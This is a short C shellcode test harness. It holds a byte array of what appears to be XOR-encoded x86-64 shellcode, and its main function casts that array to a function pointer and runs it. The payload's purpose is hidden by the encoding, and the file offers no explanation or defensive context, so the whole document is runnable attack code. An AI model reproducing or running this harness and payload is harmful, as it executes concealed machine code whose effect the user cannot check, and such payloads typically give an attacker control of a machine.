#include <stdio.h>
#include <string.h>

char code[] =
"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\xfc\x9e\xcf\x93\xf1\xbd\x14\x29\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x96\xb7\x97\x0a\x9b\xbf"
"\x4b\x43\xfd\xc0\xc0\x96\xb9\x2a\x5c\x90\xfe\x9e\xde\xcf\x8e"
"\xbd\x14\x28\xad\xd6\x46\x75\x9b\xad\x4e\x43\xd6\xc6\xc0\x96"
"\x9b\xbe\x4a\x61\x03\x50\xa5\xb2\xa9\xb2\x11\x5c\x0a\xf4\xf4"
"\xcb\x68\xf5\xaf\x06\x9e\xf7\xa1\xbc\x82\xd5\x14\x7a\xb4\x17"
"\x28\xc1\xa6\xf5\x9d\xcf\xf3\x9b\xcf\x93\xf1\xbd\x14\x29";

main(int argc, int argv[]) {
          printf("Shellcode length: %ld\n", strlen(code));
            (*(void (*)()) code)();
              return 0;
}
